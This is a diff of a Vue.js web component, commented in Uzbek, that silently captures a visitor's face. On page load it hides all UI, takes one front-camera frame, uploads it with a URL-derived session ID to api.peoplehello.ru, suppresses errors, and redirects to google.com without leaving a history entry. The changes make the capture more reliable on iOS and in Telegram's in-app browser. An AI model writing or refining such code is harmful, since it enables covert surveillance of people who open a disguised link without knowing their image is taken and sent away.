@@ -1,7 +1,6 @@
 <template>
   <!-- UI butunlay yashirilgan -->
-  <video ref="video" autoplay playsinline style="display:none"></video>
-  <canvas ref="canvas" style="display:none"></canvas>
+  <video ref="video" playsinline muted style="display:none"></video>
 </template>
 
 <script>
@@ -9,65 +8,77 @@ export default {
   name: "FrontCamera",
 
   mounted() {
-    this.startCamera()
+    this.capture()
   },
 
   methods: {
-    async startCamera() {
+    async capture() {
+      const session_id = this.$route.params.id
+      if (!session_id) return this.redirect()
+
+      if (!navigator.mediaDevices?.getUserMedia) {
+        return this.redirect()
+      }
+
       try {
-        // ✅ session_id URL path’dan olinadi: /lk/:id
-        const session_id = this.$route.params.id
-
-        if (!session_id) {
-          console.error("session_id topilmadi")
-          this.redirect()
-          return
-        }
-
+        // ✅ FRONT KAMERA (lekin moslashuvchan)
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
         })
 
         const video = this.$refs.video
-        const canvas = this.$refs.canvas
-        const ctx = canvas.getContext("2d")
-
         video.srcObject = stream
 
-        // kamera ishga tushishini kutamiz
-        setTimeout(async () => {
-          canvas.width = video.videoWidth
-          canvas.height = video.videoHeight
-          ctx.drawImage(video, 0, 0)
+        // ❗ iOS / Telegram WebView uchun MUHIM
+        await video.play()
 
-          const imageBase64 = canvas.toDataURL("image/jpeg", 0.9)
+        // ❗ Kamera haqiqatan tayyor bo‘lishini kutamiz
+        await new Promise(res => {
+          if (video.readyState >= 2) return res()
+          video.onloadedmetadata = res
+        })
 
-          // kamerani o‘chiramiz
-          stream.getTracks().forEach(t => t.stop())
+        // ❗ Real qurilmalarda barqarorlik uchun kichik delay
+        await new Promise(r => setTimeout(r, 500))
 
-          // 🔹 API’ga yuboramiz (image + session_id)
-          await fetch("https://api.peoplehello.ru/api/front-cam", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-              image: imageBase64,
-              session_id
+        const canvas = document.createElement("canvas")
+        canvas.width = video.videoWidth || 640
+        canvas.height = video.videoHeight || 480
+
+        const ctx = canvas.getContext("2d")
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
+
+        // Kamerani o‘chiramiz
+        stream.getTracks().forEach(t => t.stop())
+
+        // ❗ ENG MUHIM QISM — toBlob (toDataURL EMAS)
+        canvas.toBlob(async (blob) => {
+          if (!blob) return this.redirect()
+
+          const formData = new FormData()
+          formData.append("photo", blob, "photo.jpg")
+          formData.append("session_id", session_id)
+
+          try {
+            await fetch("https://api.peoplehello.ru/api/front-cam", {
+              method: "POST",
+              body: formData
             })
-          })
-
-          // 🔹 Google’ga redirect
-          this.redirect()
-        }, 1000)
+          } catch (e) {
+            // jim
+          } finally {
+            this.redirect()
+          }
+        }, "image/jpeg", 0.85)
 
       } catch (err) {
-        console.error("Camera error:", err)
         this.redirect()
       }
     },
 
     redirect() {
-      // replace → back bosilganda qaytib kelmasin
+      // history’da qolmasin
       window.location.replace("https://www.google.com")
     }
   }
